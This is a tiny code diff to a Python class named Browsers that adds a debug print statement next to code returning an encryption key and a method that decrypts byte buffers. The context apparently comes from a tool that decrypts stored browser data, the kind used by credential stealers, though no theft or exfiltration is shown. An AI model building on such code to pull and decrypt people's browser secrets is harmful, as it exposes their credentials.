@@ -442,6 +442,7 @@ class Browsers:
                     return self.EncryptionKey
 
                 else:
+                    print("wthelly")
                     return None
         
         def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key
